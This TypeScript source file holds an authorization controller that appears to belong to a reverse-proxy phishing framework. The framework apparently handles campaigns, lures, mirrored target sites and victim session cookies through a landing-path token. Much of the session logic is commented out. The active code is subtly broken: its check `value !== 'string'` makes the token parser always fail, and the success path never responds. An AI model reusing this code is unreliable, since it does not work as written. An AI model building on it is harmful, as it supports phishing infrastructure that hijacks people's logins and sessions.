import { DIContainer, serializeError } from '@famir/common'
import {
  FullTargetModel,
  HTTP_SERVER_ROUTER,
  HttpHeaders,
  HttpServerContext,
  HttpServerMiddleware,
  HttpServerRouter,
  Logger,
  LOGGER,
  Validator,
  VALIDATOR
} from '@famir/domain'
import { BaseController } from '../base/index.js'
import { LandingAuthData } from './authorize.js'
import { type AuthorizeService, AUTHORIZE_SERVICE } from './authorize.service.js'

export const AUTHORIZE_CONTROLLER = Symbol('AuthorizeController')

export class AuthorizeController extends BaseController {
  static inject(container: DIContainer) {
    container.registerSingleton<AuthorizeController>(
      AUTHORIZE_CONTROLLER,
      (c) =>
        new AuthorizeController(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Logger>(LOGGER),
          c.resolve<HttpServerRouter>(HTTP_SERVER_ROUTER),
          c.resolve<AuthorizeService>(AUTHORIZE_SERVICE)
        )
    )
  }

  static resolve(container: DIContainer): AuthorizeController {
    return container.resolve<AuthorizeController>(AUTHORIZE_CONTROLLER)
  }

  constructor(
    validator: Validator,
    logger: Logger,
    router: HttpServerRouter,
    protected readonly authorizeService: AuthorizeService
  ) {
    super(validator, logger, router, 'authorize')

    this.router.addMiddleware(this.landingUpgradeSessionMiddleware)
    //this.router.addMiddleware(this.landingAuthMiddleware)
    //this.router.addMiddleware(this.transparentAuthMiddleware)
  }

  private landingUpgradeSessionMiddleware: HttpServerMiddleware = async (ctx, next) => {
    try {
      const { campaign, target } = this.getSetupMirrorState(ctx)

      if (this.isAuthorizeState(ctx)) {
        await next()

        return
      }

      const foundRoute = target.isLanding && ctx.isUrlPathEquals(campaign.landingAuthPath)

      if (!foundRoute) {
        await next()

        return
      }

      const isLandingAuthPath = ctx.isUrlPathEquals(campaign.landingAuthPath)

      if (isLandingAuthPath) {
        if (!ctx.isMethod('GET')) {
          await this.renderNotFoundPage(ctx, target)

          return
        }

        const urlQuery = ctx.getUrlQuery()

        if (!urlQuery) {
          await this.renderNotFoundPage(ctx, target)

          return
        }

        const landingAuthValue = urlQuery[campaign.landingAuthParam]
        const landingAuthData = this.parseLandingAuthData(ctx, landingAuthValue)

        if (!landingAuthData) {
          await this.renderNotFoundPage(ctx, target)

          return
        }

        /*
        const { session, proxy } = await this.authorizeService.upgradeSession({
          lureId: landingAuthData.lureId,
          sessionId: landingAuthData.sessionId,
          sessionSecret: landingAuthData.sessionSecret,
        })

        if (!session) {
          this.renderFailureRedirect(ctx, target)

          return
        }

        ctx.setResponseCookie(campaign.sessionCookieName, {
          value: session.sessionId,
          maxAge: Math.round(campaign.sessionExpire / 1000),
          httpOnly: true
        })
        */
      }
    } catch (error) {
      this.handleException(error, 'landingUpgradeSession')
    }
  }

  protected async renderNotFoundPage(
    ctx: HttpServerContext,
    target: FullTargetModel
  ): Promise<void> {
    const body = Buffer.from(target.notFoundPage)

    const headers: HttpHeaders = {
      'content-type': 'text/html'
    }

    ctx.prepareResponse(404, headers, body)

    await ctx.sendResponse()
  }

  protected async renderFailureRedirect(
    ctx: HttpServerContext,
    target: FullTargetModel
  ): Promise<void> {
    const headers: HttpHeaders = {
      Location: target.failureRedirectUrl
    }

    ctx.prepareResponse(302, headers)

    await ctx.sendResponse()
  }

  protected async renderSuccessRedirect(
    ctx: HttpServerContext,
    target: FullTargetModel
  ): Promise<void> {
    const headers: HttpHeaders = {
      Location: target.successRedirectUrl
    }

    ctx.prepareResponse(302, headers)

    await ctx.sendResponse()
  }

  /*


  private transparentAuthMiddleware: HttpServerMiddleware = async (ctx, next) => {
    try {
      this.existsStateCampaign(ctx.state)
      this.existsStateTarget(ctx.state)

      const { campaign, target } = ctx.state

      if (target.isLanding) {
        await next()

        return
      }

      const sessionCookie = ctx.requestCookies[campaign.sessionCookieName]

      if (!sessionCookie) {
        const { session } = await this.createSessionUseCase({
          campaignId: campaign.campaignId
        })

        ctx.responseCookies[campaign.sessionCookieName] = session.sessionId
        ctx.responseHeaders['location'] = ctx.url

        await ctx.sendResponse(301)

        return
      }

      const isOk = this.validateSessionCookie(sessionCookie)

      if (!isOk) {
        ctx.responseCookies[campaign.sessionCookieName] = null
        ctx.responseHeaders['location'] = ctx.url

        await ctx.sendResponse(301)

        return
      }

      const { session } = await this.authSessionUseCase({
        campaignId: campaign.campaignId,
        sessionCookie
      })

      if (!session) {
        ctx.responseCookies[campaign.sessionCookieName] = null
        ctx.responseHeaders['location'] = ctx.url

        await ctx.sendResponse(301)

        return
      }

      await next()
    } catch (error) {
      this.handleException(error, 'transparentAuth')
    }
  }

  private landingAuthMiddleware: HttpServerMiddleware = async (ctx, next) => {
    try {
      this.existsStateCampaign(ctx.state)
      this.existsStateTarget(ctx.state)

      const { campaign, target } = ctx.state

      if (!this.isLandingAuthRoute(ctx, campaign, target)) {
      }

      const isFound =
        ctx.isMethod('GET') &&
        ctx.isUrlPathEquals(campaign.landingAuthPath) &&
        target.isLanding

      if (!isFound) {
        await next()

        return
      }

      const urlQuery = ctx.getUrlQuery()

      const authParamsValue = urlQuery[campaign.landingAuthParam]
      const authParamsData = this.parseAuthParamsData(authParamsValue)

      if (!authParamsData) {
        this.renderNotFoundPage()

        return
      }

      const { session, proxy } = this.landingAuthUseCase.execute({
        campaignId: campaign.campaignId,
        lureId: authParamsData.lureId,
        sessionId: authParamsData.sessionId,
        sessionSecret: authParamsData.sessionSecret
      })

      if (!session) {
        this.renderFailureRedirect()

        return
      }

      ctx.setResponseCookie(campaign.sessionCookieName, session.sessionId)

      await next()
    } catch (error) {
      this.handleException(error, 'landingAuth')
    }
  }

  private isLandingAuthRoute(
    ctx: HttpServerContext,
    campaign: CampaignModel,
    target: EnabledTargetModel
  ): boolean {
    return ctx.isMethod('GET') && ctx.isUrlPathEquals(campaign.landingAuthPath) && target.isLanding
  }
*/

  protected parseLandingAuthData(ctx: HttpServerContext, value: unknown): LandingAuthData | null {
    try {
      if (value !== 'string') {
        return null
      }

      const data: unknown = JSON.parse(Buffer.from(value, 'base64').toString())

      this.validator.assertSchema<LandingAuthData>('authorize-landing-auth-data', data)

      return data
    } catch (error) {
      ctx.addLog('parse-landing-auth-data-error', {
        value,
        error: serializeError(error)
      })

      return null
    }
  }
}
